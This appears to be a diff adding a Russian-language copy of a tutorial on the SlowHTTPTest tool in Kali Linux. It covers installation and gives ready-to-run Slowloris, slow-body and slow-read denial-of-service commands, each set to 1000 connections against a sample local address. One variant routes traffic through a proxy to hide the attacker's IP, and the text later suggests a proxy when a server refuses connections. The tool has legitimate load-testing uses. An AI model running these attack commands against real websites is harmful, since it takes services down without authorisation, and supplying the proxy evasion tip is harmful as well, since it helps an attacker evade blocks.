@@ -1,0 +1,53 @@
+https://codeby.net/blogs/stress-test-seti-dos-veb-sajta-so-slowhttptest-v-kali-linux-slowloris-slow-body-i-slow-read-ataki-v-odnom-instrumente/
+
+Установка для пользователей Kali Linux
+Для пользователей Kali Linux установка через apt-get .. (жизнь хороша!)
+
+apt-get install slowhttptest
+
+Этот набор команд делает следующее: скачивает самую последнюю версию SlowHTTPTest, распаковывает её и переходим в каталог с программой:
+
+(t=`curl -s https://github.com/shekyan/slowhttptest | grep -E -o '//slowhttptest.googlecode.com/files/slowhttptest(.)*.tar.gz" onclick="' | sed 's/////' | sed 's/" onclick="//' | head -1`; curl -s $t -o slowhttptest-last.tar.gz) && tar -xzvf slowhttptest-last.tar.gz && cd slowhttptest-*
+Т.е. теперь только остаётся выполнить конфигурацию, компиляцию и установку.
+
+Для тех, кто предпочитает скачать архив вручную, переходите сюда.
+
+$ tar -xzvf slowhttptest-x.x.tar.gz
+$ cd slowhttptest-x.x
+$ ./configure --prefix=PREFIX
+$ make
+$ sudo make install
+
+Использование SlowHTTPTest
+slowhttptest это потрясающий инструмент, который позволяет делать многие вещи. Далее только несколько примеров использования.
+****************************************************
+Пример использования в режиме slow body a.k.a R-U-Dead-Yet, результаты только выводятся на экран
+
+slowhttptest -c 1000 -B -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.37/info.php -x 10 -p 3
+Тоже самое, но график сохраняется в файл
+
+slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.37/info.php -x 10 -p 3
+***************************************************
+Пример использования в режиме slow headers a.k.a. Slowloris
+
+slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://192.168.1.37/info.php -x 24 -p 3
+Тоже самое, но график сохраняется в файл
+
+slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://192.168.1.37/info.php -x 24 -p 3
+*******************************************************
+Пример использования в режиме Slow Read через прокси.
+
+Здесь x.x.x.x:8080 — это прокси, который используется для доступа к веб-сайту с IP отличного от вашего:
+
+slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://192.168.1.37/info.php -p 5 -l 350 -e x.x.x.x:8080
+
+
+Последнее сообщение, которые выводит программа при закрытии, этот статус завершения, они могут быть следующими:
+
+“Hit test time limit” программа достигла лимита времени, заданного аргументом -l
+“No open connections left” пир закрыл все соединения
+“Cannot establish connection” не было установлено соединений за время N секунд теста, где N или величина аргумента -i, или 10 (значение по умолчанию). Это может случиться если нет маршрута к удалённому хосту или пир лёг.
+“Connection refused” удалённый сервер не принимает соединения (может быть только от тебя? Попробуйте использовать прокси) на определённом порту
+“Cancelled by user” вы нажали Ctrl-C или отправили SIGINT каким-либо другим образом
+“Unexpected error” не должно никогда случаться.
+
